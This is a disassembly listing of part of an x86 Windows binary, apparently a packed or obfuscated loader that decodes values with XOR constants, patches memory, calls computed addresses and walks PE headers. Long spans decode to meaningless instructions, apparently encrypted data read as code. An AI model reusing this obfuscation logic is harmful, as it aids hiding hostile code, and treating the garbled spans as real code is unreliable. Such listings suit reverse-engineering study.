  40a048:	mov    eax,DWORD PTR [ebp-0x64]
  40a04b:	xor    eax,esi
  40a04d:	add    eax,ebx
  40a04f:	push   eax
  40a050:	mov    eax,DWORD PTR [ebp-0x70]
  40a053:	xor    eax,esi
  40a055:	add    eax,ebx
  40a057:	push   eax
  40a058:	mov    eax,DWORD PTR [ebp-0x48]
  40a05b:	xor    eax,esi
  40a05d:	add    eax,ebx
  40a05f:	push   eax
  40a060:	lea    eax,[ebp-0x10c]
  40a066:	push   eax
  40a067:	push   DWORD PTR [ebp+0xc]
  40a06a:	push   DWORD PTR [ebp-0x4]
  40a06d:	call   0x40834f
  40a072:	test   eax,eax
  40a074:	je     0x40a0a5
  40a07a:	lea    eax,[ebp-0x10c]
  40a080:	push   eax
  40a081:	mov    eax,DWORD PTR [ebp-0x4]
  40a084:	xor    eax,esi
  40a086:	add    eax,ebx
  40a088:	push   eax
  40a089:	mov    eax,DWORD PTR [ebp+0x10]
  40a08c:	add    eax,0xaa
  40a091:	push   eax
  40a092:	mov    eax,DWORD PTR [ebp+0x10]
  40a095:	mov    eax,DWORD PTR [eax+0x198]
  40a09b:	push   DWORD PTR [eax]
  40a09d:	call   0x40b2c8
  40a0a2:	mov    DWORD PTR [ebp-0x24],eax
  40a0a5:	cmp    DWORD PTR [ebp-0x24],0x0
  40a0a9:	lea    edi,[ebp+0x4]
  40a0ac:	mov    DWORD PTR [ebp-0x7c],edi
  40a0af:	je     0x40a179
  40a0b5:	lea    eax,[ebp-0x38]
  40a0b8:	push   eax
  40a0b9:	mov    eax,DWORD PTR [ebp-0x78]
  40a0bc:	xor    eax,esi
  40a0be:	add    eax,ebx
  40a0c0:	push   eax
  40a0c1:	mov    eax,DWORD PTR [ebp-0x48]
  40a0c4:	xor    eax,esi
  40a0c6:	add    eax,ebx
  40a0c8:	push   eax
  40a0c9:	push   DWORD PTR [ebp-0x24]
  40a0cc:	lea    eax,[ebp-0x10c]
  40a0d2:	push   eax
  40a0d3:	push   DWORD PTR [ebp+0xc]
  40a0d6:	push   DWORD PTR [ebp-0x4]
  40a0d9:	call   0x408a84
  40a0de:	test   eax,eax
  40a0e0:	je     0x40a10e
  40a0e6:	lea    eax,[ebp-0x10c]
  40a0ec:	push   eax
  40a0ed:	mov    eax,DWORD PTR [ebp-0x4]
  40a0f0:	xor    eax,esi
  40a0f2:	add    eax,ebx
  40a0f4:	push   eax
  40a0f5:	mov    eax,DWORD PTR [ebp+0x10]
  40a0f8:	add    eax,0xee
  40a0fd:	push   eax
  40a0fe:	mov    eax,DWORD PTR [ebp+0x10]
  40a101:	mov    eax,DWORD PTR [eax+0x198]
  40a107:	push   DWORD PTR [eax]
  40a109:	call   0x40b2c8
  40a10e:	mov    ecx,DWORD PTR [ebp-0x48]
  40a111:	xor    ecx,esi
  40a113:	mov    eax,0xffcd8d63
  40a118:	sub    eax,ecx
  40a11a:	sub    eax,DWORD PTR [ebp-0x24]
  40a11d:	mov    ecx,DWORD PTR [ebp-0x68]
  40a120:	add    ecx,eax
  40a122:	mov    eax,DWORD PTR [ebp-0x24]
  40a125:	mov    DWORD PTR [eax+0x1],ecx
  40a128:	mov    al,BYTE PTR [ebp-0x29]
  40a12b:	mov    ecx,DWORD PTR [ebp-0x24]
  40a12e:	xor    al,0x48
  40a130:	sub    al,0x36
  40a132:	mov    BYTE PTR [ecx],al
  40a134:	lea    eax,[ebp-0x24]
  40a137:	inc    BYTE PTR [eax]
  40a139:	inc    eax
  40a13a:	push   eax
  40a13b:	pop    ecx
  40a13c:	dec    ecx
  40a13d:	xchg   ecx,edx
  40a13f:	dec    BYTE PTR [edx]
  40a141:	push   DWORD PTR [ebp+0x10]
  40a144:	mov    eax,ds:0x412264
  40a149:	mov    eax,DWORD PTR [eax]
  40a14b:	push   DWORD PTR [eax]
  40a14d:	lea    eax,ds:0x412280
  40a153:	push   DWORD PTR [eax]
  40a155:	lea    eax,ds:0x41202c
  40a15b:	push   DWORD PTR [eax]
  40a15d:	lea    eax,ds:0x412260
  40a163:	push   DWORD PTR [eax]
  40a165:	lea    eax,ds:0x41237c
  40a16b:	push   DWORD PTR [eax]
  40a16d:	xchg   ebx,edx
  40a16f:	inc    ebx
  40a170:	inc    ebx
  40a171:	sub    ebx,0x3
  40a174:	push   ebx
  40a175:	pop    eax
  40a176:	call   DWORD PTR [eax+0x1]
  40a179:	mov    DWORD PTR [ebp-0x6c],edi
  40a17c:	mov    eax,DWORD PTR [ebp-0x3c]
  40a17f:	mov    eax,DWORD PTR [ebp-0x18]
  40a182:	push   DWORD PTR [ebp-0x20]
  40a185:	lea    eax,[ebp-0x6c]
  40a188:	push   eax
  40a189:	call   0x406433
  40a18e:	mov    eax,ds:0x4121a8
  40a193:	push   0x4
  40a195:	add    eax,0x1cc
  40a19a:	push   eax
  40a19b:	lea    eax,[ebp-0x3c]
  40a19e:	push   eax
  40a19f:	call   0x4052e7
  40a1a4:	mov    eax,DWORD PTR [ebp-0x3c]
  40a1a7:	mov    eax,DWORD PTR [eax]
  40a1a9:	pop    edi
  40a1aa:	pop    esi
  40a1ab:	pop    ebx
  40a1ac:	leave  
  40a1ad:	ret    0xc
  40a1b0:	push   ebp
  40a1b1:	mov    ebp,esp
  40a1b3:	sub    esp,0x20
  40a1b6:	leave  
  40a1b7:	ret    0x4
  40a1ba:	push   ebp
  40a1bb:	mov    ebp,esp
  40a1bd:	push   ecx
  40a1be:	and    DWORD PTR ds:0x430556,edx
  40a1c4:	mov    DWORD PTR [ebp-0x4],0xf89c8535
  40a1cb:	mov    eax,DWORD PTR [ebp+0x8]
  40a1ce:	or     DWORD PTR ds:0x42ee30,0x430552
  40a1d8:	mov    al,BYTE PTR [eax]
  40a1da:	adc    DWORD PTR ds:0x42ee10,0x639e
  40a1e4:	add    al,0x36
  40a1e6:	sbb    DWORD PTR ds:0x4304a2,0x596d
  40a1f0:	xor    al,0x48
  40a1f2:	mov    DWORD PTR ds:0x43054e,0x7356
  40a1fc:	cmp    al,0xcb
  40a1fe:	mov    DWORD PTR ds:0x4304b2,0x64e0
  40a208:	jne    0x40a51c
  40a20e:	xor    DWORD PTR ds:0x4304b6,0x7c62
  40a218:	jmp    0x40a496
  40a21d:	lods   al,BYTE PTR ds:[esi]
  40a21e:	inc    edx
  40a21f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a220:	es jge 0x40a21c
  40a223:	lods   eax,DWORD PTR ds:[esi]
  40a224:	inc    esp
  40a225:	pop    ecx
  40a226:	push   cs
  40a227:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a228:	mov    ds:0xb8c1a676,eax
  40a22d:	rcl    esi,cl
  40a22f:	jle    0x40a2af
  40a231:	fbstp  TBYTE PTR [eax+0x7e]
  40a234:	jle    0x40a230
  40a236:	lock jmp 0x40a263
  40a239:	dec    ecx
  40a23a:	mov    eax,ds:0xa4a76455
  40a23f:	fisub  WORD PTR [ebp+0x10]
  40a242:	pop    ds
  40a243:	loope  0x40a21f
  40a245:	ins    BYTE PTR es:[edi],dx
  40a246:	stos   DWORD PTR es:[edi],eax
  40a247:	out    dx,eax
  40a248:	add    BYTE PTR [edi+0x14],0xa1
  40a24c:	lock fnstcw WORD PTR [edx+0x34]
  40a250:	ss iret 
  40a252:	push   0xbb5eefc
  40a257:	in     al,0xc4
  40a259:	mov    ch,0xa4
  40a25b:	lock fild DWORD PTR [edx-0x13eaa856]
  40a262:	rep movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a264:	call   0x1d08:0xb6b7f704
  40a26b:	fcom   DWORD PTR [esi+0x36]
  40a26e:	cs scas al,BYTE PTR es:[edi]
  40a270:	sbb    DWORD PTR [eax+0xa],0x9a64fe5a
  40a277:	mov    cl,0xfd
  40a279:	adc    al,BYTE PTR [esi-0x4]
  40a27c:	je     0x40a289
  40a27e:	(bad)  
  40a27f:	cld    
  40a280:	hlt    
  40a281:	or     DWORD PTR [ecx-0x1968f4cb],0xffffff8f
  40a288:	stos   BYTE PTR es:[edi],al
  40a289:	inc    bp
  40a28b:	out    0xd5,al
  40a28d:	xor    al,0x87
  40a28f:	or     bl,BYTE PTR [esi]
  40a291:	retf   
  40a292:	jne    0x40a2be
  40a294:	pop    ss
  40a295:	pop    edx
  40a296:	mov    cs,ebx
  40a298:	(bad)  
  40a299:	(bad)  
  40a29b:	or     bl,BYTE PTR [ebp+0x23]
  40a29e:	xchg   esi,eax
  40a29f:	push   cs
  40a2a0:	int3   
  40a2a1:	sar    BYTE PTR ds:0x4384bf79,cl
  40a2a7:	(bad)  
  40a2a8:	push   esi
  40a2a9:	test   eax,0xac4fb3bb
  40a2ae:	in     al,0x1a
  40a2b0:	jmp    DWORD PTR [ebx+0x4b]
  40a2b3:	jae    0x40a2d8
  40a2b5:	xchg   esp,eax
  40a2b6:	shl    bh,cl
  40a2b8:	sub    cl,dh
  40a2ba:	add    eax,0x6fab8976
  40a2bf:	mov    bh,bl
  40a2c1:	imul   esi,DWORD PTR [ebx-0x5089d7d2],0x12e24b25
  40a2cb:	inc    eax
  40a2cc:	ja     0x40a30c
  40a2ce:	and    eax,0xdff6eab1
  40a2d3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a2d4:	jge    0x40a2d8
  40a2d6:	fsub   DWORD PTR [edx]
  40a2d8:	mov    cl,0xb2
  40a2da:	stc    
  40a2db:	inc    ecx
  40a2dc:	enter  0x1c1,0x12
  40a2e0:	cmp    eax,0x7b280083
  40a2e5:	ja     0x40a360
  40a2e7:	jnp    0x40a2e5
  40a2e9:	enter  0x9197,0x7
  40a2ed:	mov    WORD PTR [ecx+0x40ab1ea4],?
  40a2f3:	mov    ch,BYTE PTR [edi]
  40a2f5:	sub    BYTE PTR [ecx],ah
  40a2f7:	outs   dx,DWORD PTR ds:[esi]
  40a2f8:	icebp  
  40a2f9:	cmp    BYTE PTR [eax],bl
  40a2fb:	dec    esp
  40a2fc:	jb     0x40a2a6
  40a2fe:	jno    0x40a310
  40a300:	and    al,0x6
  40a302:	cwde   
  40a303:	sub    al,0xe8
  40a305:	push   ebx
  40a306:	xchg   ebp,eax
  40a307:	cwde   
  40a308:	mov    edi,0x99a7f68b
  40a30d:	adc    al,0xed
  40a30f:	ja     0x40a379
  40a311:	ror    DWORD PTR [edx+0x2058fd2a],cl
  40a317:	scas   eax,DWORD PTR es:[di]
  40a319:	add    BYTE PTR [esi+eax*8-0x5e],ch
  40a31d:	aaa    
  40a31e:	cmp    BYTE PTR [edi-0x47],dh
  40a321:	lds    esp,FWORD PTR [ebp+eax*4-0x1b0708aa]
  40a328:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a329:	nop
  40a32a:	sbb    al,0xde
  40a32c:	int    0x33
  40a32e:	jle    0x40a30f
  40a330:	std    
  40a331:	or     al,0x9d
  40a333:	add    BYTE PTR [edx+0x812778a],bl
  40a339:	call   0x8f38:0x3069dcb6
  40a340:	sbb    al,0x42
  40a342:	xor    ch,BYTE PTR [edx]
  40a344:	pop    es
  40a345:	or     BYTE PTR [edx+0x3a],0x6
  40a349:	in     eax,0xb2
  40a34b:	and    dl,BYTE PTR [edi-0x462a2af4]
  40a351:	aam    0xfe
  40a353:	out    0x70,al
  40a355:	fs add eax,0xb96f8204
  40a35b:	sub    ebp,ecx
  40a35d:	(bad)  
  40a35f:	jp     0x40a383
  40a361:	and    eax,0x4f733c9e
  40a366:	mov    ds:0x479d7691,eax
  40a36b:	sahf   
  40a36c:	adc    DWORD PTR [edx],ebp
  40a36e:	bound  ebp,QWORD PTR [ebp-0x3e]
  40a371:	sbb    al,0xe3
  40a373:	iret   
  40a374:	sub    eax,DWORD PTR [ebx+edx*4]
  40a377:	stos   DWORD PTR es:[edi],eax
  40a378:	outs   dx,DWORD PTR ds:[esi]
  40a379:	adc    eax,0xcfd4e034
  40a37e:	xchg   esi,eax
  40a37f:	in     eax,dx
  40a380:	push   ecx
  40a381:	test   edi,ebp
  40a383:	test   ebx,esp
  40a385:	das    
  40a386:	jecxz  0x40a357
  40a388:	ds ins DWORD PTR es:[edi],dx
  40a38a:	jae    0x40a35e
  40a38c:	mov    dh,0x8d
  40a38e:	mov    al,0xbb
  40a390:	add    ebx,0x59
  40a393:	ins    BYTE PTR es:[edi],dx
  40a394:	mov    ss,WORD PTR gs:[edi-0x4b353dd0]
  40a39b:	xchg   esi,eax
  40a39c:	xlat   BYTE PTR ds:[ebx]
  40a39d:	add    DWORD PTR [ecx-0x30],edx
  40a3a0:	mov    ecx,0x219351be
  40a3a5:	aas    
  40a3a6:	ret    
  40a3a7:	xor    bl,bl
  40a3a9:	fdivr  QWORD PTR [eax+ebx*4-0x58]
  40a3ad:	ins    BYTE PTR es:[edi],dx
  40a3ae:	mov    ch,0x96
  40a3b0:	popf   
  40a3b1:	and    BYTE PTR [esi+edx*4],ch
  40a3b4:	repz mov al,ds:0x227cc60a
  40a3ba:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a3bb:	mov    esp,0x50d91741
  40a3c0:	mov    ds:0x501da88c,al
  40a3c5:	mov    eax,0xeb095eb0
  40a3ca:	push   edi
  40a3cb:	inc    edi
  40a3cc:	xchg   edx,eax
  40a3cd:	ficomp WORD PTR ds:0x6ad12919
  40a3d3:	pop    edx
  40a3d4:	das    
  40a3d5:	sysexit 
  40a3d7:	pop    ss
  40a3d8:	adc    eax,0x8507cd36
  40a3dd:	cmp    al,0x78
  40a3df:	xchg   edx,eax
  40a3e0:	pop    eax
  40a3e1:	mov    ebp,0x233f1dda
  40a3e6:	pop    esp
  40a3e7:	or     ebx,ebp
  40a3e9:	aas    
  40a3ea:	mov    cl,0x4c
  40a3ec:	fs pop ebp
  40a3ee:	inc    edi
  40a3ef:	rol    DWORD PTR [edi+eiz*8+0x27eb948c],1
  40a3f6:	out    dx,al
  40a3f7:	iret   
  40a3f8:	xchg   ecx,eax
  40a3f9:	iret   
  40a3fa:	or     al,0x5b
  40a3fc:	cmp    DWORD PTR [eax+0x53],ebp
  40a3ff:	xchg   esi,eax
  40a400:	ins    BYTE PTR es:[edi],dx
  40a401:	pop    es
  40a402:	aaa    
  40a403:	mov    esi,?
  40a405:	inc    ebp
  40a406:	out    0x68,eax
  40a408:	mov    esp,0xdfa87a44
  40a40d:	dec    esp
  40a40e:	out    0xd3,eax
  40a410:	ror    BYTE PTR [ecx],1
  40a412:	or     edx,DWORD PTR [eax-0x56cdd372]
  40a418:	mov    edx,0xe0161fa2
  40a41d:	mov    al,0x10
  40a41f:	ficom  DWORD PTR [edx+esi*1+0x205b74b9]
  40a426:	ins    DWORD PTR es:[edi],dx
  40a427:	dec    edi
  40a428:	and    eax,0x8ba35c79
  40a42d:	cmp    eax,0x8dc23953
  40a432:	call   0x5202:0xb8715118
  40a439:	gs jae 0x40a3dd
  40a43c:	mov    cl,0x5
  40a43e:	aas    
  40a43f:	int    0xc7
  40a441:	or     eax,0x470a4e95
  40a446:	xchg   ebp,eax
  40a447:	sub    BYTE PTR [ecx-0x5d749b36],dh
  40a44d:	xchg   edx,eax
  40a44e:	imul   ebp,DWORD PTR [ebx],0x2f
  40a451:	les    esp,FWORD PTR [edi+0x795bb255]
  40a457:	pop    ds
  40a458:	sahf   
  40a459:	lods   al,BYTE PTR ds:[esi]
  40a45a:	sbb    al,0x7e
  40a45c:	in     al,dx
  40a45d:	push   ebx
  40a45e:	ficomp DWORD PTR [edi+edx*8+0x4f9d32a3]
  40a465:	inc    eax
  40a466:	rcr    DWORD PTR [edi],1
  40a468:	cwde   
  40a469:	adc    ecx,DWORD PTR ds:0xead38744
  40a46f:	mov    al,ds:0x388eb6f1
  40a474:	push   edi
  40a475:	icebp  
  40a476:	jno    0x40a40d
  40a478:	sti    
  40a479:	dec    esi
  40a47a:	jne    0x40a4f7
  40a47c:	dec    esi
  40a47d:	dec    esi
  40a47e:	imul   eax,DWORD PTR [edi],0xffffff9c
  40a481:	out    dx,eax
  40a482:	jmp    0xb94a92e5
  40a487:	inc    esi
  40a488:	gs cwde 
  40a48a:	lods   al,BYTE PTR ds:[esi]
  40a48b:	push   es
  40a48c:	mov    ds:0x5e6aea2b,eax
  40a491:	xlat   BYTE PTR ds:[ebx]
  40a492:	pop    esi
  40a493:	xchg   BYTE PTR [ecx],ch
  40a495:	and    eax,0xc708458b
  40a49a:	add    eax,0x430542
  40a49f:	pop    ss
  40a4a0:	add    BYTE PTR [eax],al
  40a4a2:	add    BYTE PTR [ebx+0x4305423d],al
  40a4a8:	add    BYTE PTR [eax],al
  40a4aa:	je     0x40a4d8
  40a4b0:	cmp    DWORD PTR ds:0x430542,0x24
  40a4b7:	jne    0x40a4c6
  40a4bd:	push   DWORD PTR [ebp-0x28]
  40a4c0:	call   DWORD PTR ds:0x42eae4
  40a4c6:	mov    ecx,DWORD PTR ds:0x430542
  40a4cc:	dec    ecx
  40a4cd:	mov    DWORD PTR ds:0x430542,ecx
  40a4d3:	jmp    0x40a4a3
  40a4d8:	mov    ecx,DWORD PTR [ebp+0x8]
  40a4db:	sub    edx,0x356a
  40a4e1:	add    ecx,DWORD PTR [eax+0x3c]
  40a4e4:	and    eax,edx
  40a4e6:	mov    edx,0x7510856
  40a4eb:	mov    DWORD PTR [ebp+0x8],ecx
  40a4ee:	mov    eax,DWORD PTR [ebp-0x4]
  40a4f1:	xor    eax,edx
  40a4f3:	push   esi
  40a4f4:	mov    esi,DWORD PTR [ebp+0x8]
  40a4f7:	mov    ecx,0x32729d
  40a4fc:	add    eax,ecx
  40a4fe:	cmp    DWORD PTR [esi+0x54],eax
  40a501:	pop    esi
  40a502:	je     0x40a510
  40a508:	mov    eax,DWORD PTR [ebp+0x8]
  40a50b:	jmp    0x40a7a7
  40a510:	mov    eax,DWORD PTR [ebp-0x4]
  40a513:	xor    eax,edx
  40a515:	add    eax,ecx
  40a517:	jmp    0x40a7a7
  40a51c:	mov    eax,DWORD PTR [ebp-0x4]
  40a51f:	xor    eax,0x7510856
  40a524:	jmp    0x40a7a2
  40a529:	mov    esi,edi
  40a52b:	pop    ds
  40a52c:	outs   dx,BYTE PTR ds:[esi]
  40a52d:	adc    esp,DWORD PTR [esi+0x5b]
  40a530:	jnp    0x40a586
  40a532:	xor    eax,0x4b9a360
  40a537:	loop   0x40a537
  40a539:	mov    ah,0xe8
  40a53b:	jle    0x40a5bb
  40a53d:	fbstp  TBYTE PTR [eax+0x7e]
  40a540:	jle    0x40a5be
  40a542:	leave  
  40a543:	sar    BYTE PTR [ecx],1
  40a545:	bound  ebx,QWORD PTR [esi]
  40a547:	leave  
  40a548:	fistp  QWORD PTR [eax-0x26]
  40a54b:	mov    al,ds:0x80c0d9c0
  40a550:	cdq    
  40a551:	inc    edx
  40a552:	js     0x40a545
  40a554:	cmp    DWORD PTR es:[edx-0x77],0xa11d1d0c
  40a55c:	xchg   esp,eax
  40a55d:	mov    eax,0xc8ac476f
  40a562:	push   edx
  40a563:	sub    BYTE PTR [esi],bl
  40a565:	in     eax,0x9
  40a567:	pop    ds
  40a568:	aas    
  40a569:	push   ecx
  40a56a:	mov    bh,0x79
  40a56c:	hlt    
  40a56d:	mov    ecx,DWORD PTR [esi]
  40a56f:	test   DWORD PTR [edi+0x39],edi
  40a572:	sbb    al,0xf3
  40a574:	mov    dh,BYTE PTR [esi]
  40a576:	fdivr  DWORD PTR [ebp+0xf080d9e]
  40a57c:	mov    DWORD PTR [ecx+ecx*8+0x40f400c4],esi
  40a583:	aas    
  40a584:	js     0x40a51b
  40a586:	nop
  40a587:	sti    
  40a588:	fdiv   QWORD PTR [ebx+0x13104481]
  40a58e:	mov    ds:0x999d39f0,al
  40a593:	push   0x61
  40a595:	cmp    ch,BYTE PTR [ebx+ebp*8+0x3777be0f]
  40a59c:	push   edx
  40a59d:	xchg   DWORD PTR [esi-0x21],ecx
  40a5a0:	sbb    DWORD PTR [ebx+0x1c],ebx
  40a5a3:	stc    
  40a5a4:	dec    DWORD PTR [esi+0x2c]
  40a5a7:	je     0x40a61f
  40a5a9:	lods   eax,DWORD PTR ds:[esi]
  40a5aa:	sub    BYTE PTR [edi+eax*8-0xb],bh
  40a5ae:	mov    ebx,DWORD PTR [eax-0xb615004]
  40a5b4:	push   esp
  40a5b5:	es ret 
  40a5b7:	inc    ebp
  40a5b8:	shr    BYTE PTR es:[ebp-0x80],1
  40a5bc:	sub    eax,ebp
  40a5be:	mov    eax,ds:0xca2db62e
  40a5c3:	pop    edi
  40a5c4:	cli    
  40a5c5:	jge    0x40a5e7
  40a5c7:	rol    edx,cl
  40a5c9:	dec    esi
  40a5ca:	in     al,0x56
  40a5cc:	push   edx
  40a5cd:	out    0x5,al
  40a5cf:	loop   0x40a55a
  40a5d1:	repz add BYTE PTR [edi+0x48],bh
  40a5d5:	sbb    eax,0x8e61f8e3
  40a5da:	mov    bl,BYTE PTR [ebx+edi*2+0x6a]
  40a5de:	scas   eax,DWORD PTR es:[edi]
  40a5df:	add    BYTE PTR [ebx-0x64],dl
  40a5e2:	add    ah,BYTE PTR [edx-0x61ff1742]
  40a5e8:	or     DWORD PTR [esi+ebp*8-0x2696205d],ebp
  40a5ef:	out    dx,eax
  40a5f0:	mov    BYTE PTR [esi+eiz*2],0xeb
  40a5f4:	mov    ds:0x721471ce,eax
  40a5f9:	push   es
  40a5fa:	fucom  st(4)
  40a5fc:	add    eax,0x63763cf3
  40a601:	leave  
  40a602:	outs   dx,DWORD PTR ds:[si]
  40a604:	push   ds
  40a605:	mov    BYTE PTR [ecx+0x7d],ah
  40a608:	loop   0x40a656
  40a60a:	mov    ebx,0x21609419
  40a60f:	xchg   BYTE PTR [edx+0x1ecec113],bh
  40a615:	aam    0x32
  40a617:	in     eax,dx
  40a618:	(bad)  
  40a619:	call   0xc5724d70
  40a61e:	repz push ecx
  40a620:	rol    BYTE PTR [eax+0x372a7134],1
  40a626:	enter  0x1f27,0x86
  40a62a:	data16 mov gs,WORD PTR [ebx+0x77b2e705]
  40a631:	outs   dx,DWORD PTR ds:[esi]
  40a632:	ins    BYTE PTR es:[edi],dx
  40a633:	lods   al,BYTE PTR ds:[esi]
  40a634:	rcr    BYTE PTR [eax],0x8c
  40a637:	cmp    eax,0x167628d3
  40a63c:	ret    0x4ad3
  40a63f:	shr    DWORD PTR [ebx+0x24],0x65
  40a643:	mov    ecx,0xa23859ab
  40a648:	pop    edi
  40a649:	imul   edi,ebp,0x73
  40a64c:	mov    gs,eax
  40a64e:	ret    0x545b
  40a651:	out    dx,eax
  40a652:	pop    edx
  40a653:	aam    0x3a
  40a655:	and    al,0xed
  40a657:	fidivr WORD PTR [edx-0x6fc64e50]
  40a65d:	jle    0x40a64c
  40a65f:	xor    edx,esi
  40a661:	ja     0x40a6dc
  40a663:	lods   al,BYTE PTR ds:[esi]
  40a664:	ins    DWORD PTR es:[edi],dx
  40a665:	sar    DWORD PTR [ebp+0x17],1
  40a668:	mov    eax,ds:0xf9cca9ee
  40a66d:	sub    bh,BYTE PTR [esi+0x3a]
  40a670:	(bad)  
  40a671:	push   ds
  40a672:	mov    edi,0xd39d55da
  40a677:	aas    
  40a678:	dec    esi
  40a679:	push   edi
  40a67a:	(bad)  
  40a67b:	mov    edx,edi
  40a67d:	and    bl,0x47
  40a680:	or     BYTE PTR [esi],bl
  40a682:	sti    
  40a683:	(bad)  
  40a684:	in     eax,dx
  40a685:	cmp    BYTE PTR [edi-0x6c154d84],al
  40a68b:	hlt    
  40a68c:	popa   
  40a68d:	test   DWORD PTR [ecx],eax
  40a68f:	xchg   ecx,eax
  40a690:	rol    al,cl
  40a692:	sub    al,0x8b
  40a694:	ret    
  40a695:	into   
  40a696:	jge    0x40a70e
  40a698:	into   
  40a699:	pusha  
  40a69a:	jno    0xd63cff7
  40a6a0:	cmp    BYTE PTR [eax],cl
  40a6a2:	cs push esp
  40a6a4:	push   DWORD PTR [eax+0x3d3a167c]
  40a6aa:	das    
  40a6ab:	scas   eax,DWORD PTR es:[edi]
  40a6ac:	xchg   esi,eax
  40a6ad:	mov    bh,0x94
  40a6af:	lahf   
  40a6b0:	adc    bh,dh
  40a6b2:	cmp    al,0x32
  40a6b4:	pop    ss
  40a6b5:	sub    cl,BYTE PTR [ebx]
  40a6b7:	push   ebx
  40a6b8:	adc    al,0xa8
  40a6ba:	sar    DWORD PTR [esp+edi*4],cl
  40a6bd:	push   0xc4baad03
  40a6c2:	xchg   esi,eax
  40a6c3:	pusha  
  40a6c4:	js     0x40a656
  40a6c6:	mov    WORD PTR [ebx+0xf70d288],ss
  40a6cc:	ins    BYTE PTR es:[edi],dx
  40a6cd:	jne    0x40a6c3
  40a6cf:	xchg   esi,eax
  40a6d0:	jne    0x40a684
  40a6d2:	fwait
  40a6d3:	or     BYTE PTR [edx-0xea94684],0x84
  40a6da:	imul   edi,DWORD PTR [ebx+0x60],0x8e93d50e
  40a6e1:	or     al,0x70
  40a6e3:	xor    dl,al
  40a6e5:	imul   esp,DWORD PTR [edx],0xffffffa6
  40a6e8:	ja     0x40a6cf
  40a6ea:	aad    0x1d
  40a6ec:	enter  0x588b,0x5b
  40a6f0:	fidiv  DWORD PTR [edx]
  40a6f2:	jp     0x40a72a
  40a6f4:	(bad)
  40a6f8:	xchg   edi,eax
  40a6f9:	xor    eax,0x49d7fadd
  40a6fe:	scas   al,BYTE PTR es:[edi]
  40a6ff:	dec    esp
  40a700:	dec    eax
  40a701:	cmp    BYTE PTR [eax],dh
  40a703:	inc    ebx
  40a704:	(bad)  
  40a705:	pushf  
  40a706:	push   edx
  40a707:	jmp    0x41cf661e
  40a70c:	imul   BYTE PTR [esi+0x2eb364f9]
  40a712:	setp   BYTE PTR [eax+0x506f146a]
  40a719:	cmp    dl,BYTE PTR [edi-0xdc3b5c1]
  40a71f:	xchg   edx,eax
  40a720:	xchg   ebx,eax
  40a721:	sub    BYTE PTR [ecx],dh
  40a723:	mov    ss,eax
  40a725:	sub    BYTE PTR [ebx],bl
  40a727:	pushf  
  40a728:	adc    edx,eax
  40a72a:	fwait
  40a72b:	cmc    
  40a72c:	daa    
  40a72d:	call   0xa155:0xbab981cb
  40a734:	retf   
  40a735:	push   ebp
  40a736:	cli    
  40a737:	mov    esp,0x52b93608
  40a73c:	or     eax,0x94b0cef7
  40a741:	data16 aaa 
  40a743:	jnp    0x40a6f1
  40a745:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a746:	and    cl,BYTE PTR [edx]
  40a748:	fimul  DWORD PTR [esp+ebp*4]
  40a74b:	push   ebx
  40a74c:	jge    0x40a704
  40a74e:	leave  
  40a74f:	mov    ecx,0xad59266e
  40a754:	push   cs
  40a755:	mov    ah,0x0
  40a757:	sti    
  40a758:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a759:	daa    
  40a75a:	mov    ebx,0xf11ea2dc
  40a75f:	test   al,0x6a
  40a761:	xchg   ebx,eax
  40a762:	enter  0xa0d,0x39
  40a766:	jmp    0x7194:0x56b0abfc
  40a76d:	shr    DWORD PTR [edx-0xe],1
  40a770:	fiadd  WORD PTR [ecx+0x62eb2714]
  40a776:	inc    esp
  40a777:	mov    DWORD PTR [edx],edi
  40a779:	je     0x40a75e
  40a77b:	ret    0x82b5
  40a77e:	sbb    BYTE PTR [esi],bl
  40a780:	fmul   st,st(0)
  40a782:	into   
  40a783:	imul   esp,DWORD PTR [ebx-0x49a91dfd],0xb6652e0b
  40a78d:	lods   eax,DWORD PTR ds:[esi]
  40a78e:	and    dl,ah
  40a790:	and    esi,DWORD PTR [edx-0x7c3e255c]
  40a796:	dec    sp
  40a798:	sub    al,ah
  40a79a:	cs jmp 0x40a745
  40a79d:	retf   0x2863
  40a7a0:	leave  
  40a7a1:	bound  eax,QWORD PTR ds:0x32729d
  40a7a7:	leave  
  40a7a8:	ret    0x4
  40a7ab:	push   ebp
  40a7ac:	mov    ebp,esp
  40a7ae:	push   ecx
  40a7af:	inc    eax
  40a7b0:	push   ecx
  40a7b1:	and    DWORD PTR ds:0x43049e,0x0
  40a7bb:	jmp    0x40a7cb
  40a7c0:	mov    eax,ds:0x43049e
  40a7c5:	inc    eax
  40a7c6:	mov    ds:0x43049e,eax
  40a7cb:	cmp    DWORD PTR ds:0x43049e,0x10
  40a7d2:	jae    0x40a821
  40a7d8:	cmp    DWORD PTR ds:0x43049e,0x9
  40a7df:	jne    0x40a7f1
  40a7e5:	push   DWORD PTR [ebp-0x24]
  40a7e8:	push   DWORD PTR [ebp-0x10]
  40a7eb:	call   DWORD PTR ds:0x42ebd0
  40a7f1:	cmp    DWORD PTR ds:0x43049e,0x8
  40a7f8:	jne    0x40a809
  40a7fe:	mov    eax,ds:0x43049e
  40a803:	inc    eax
  40a804:	mov    ds:0x43049e,eax
  40a809:	jmp    0x40a7c0
  40a80e:	mov    ecx,DWORD PTR ds:0x4304d2
  40a814:	xor    edx,edx
  40a816:	add    edx,DWORD PTR ds:0x4304d6
  40a81c:	sub    ecx,edx
  40a81e:	xor    ecx,DWORD PTR [ecx+edx*1]
  40a821:	mov    DWORD PTR [ebp-0x8],0xf89c8535
  40a828:	sbb    ecx,0x259c
  40a82e:	jmp    0x40aa29
  40a833:	imul   ebp,ecx,0x7a81ca81
  40a839:	jge    0x40a8a8
  40a83b:	dec    esp
  40a83c:	jb     0x40a8a1
  40a83e:	jmp    0x40a7d6
  40a840:	xchg   ebp,eax
  40a841:	shr    DWORD PTR [edi],1
  40a843:	adc    eax,0x5c7e7eeb
  40a848:	jg     0x40a8c8
  40a84a:	jle    0x40a80e
  40a84c:	outs   dx,DWORD PTR ds:[esi]
  40a84d:	add    al,0x73
  40a84f:	mov    edx,0x438c295c
  40a854:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
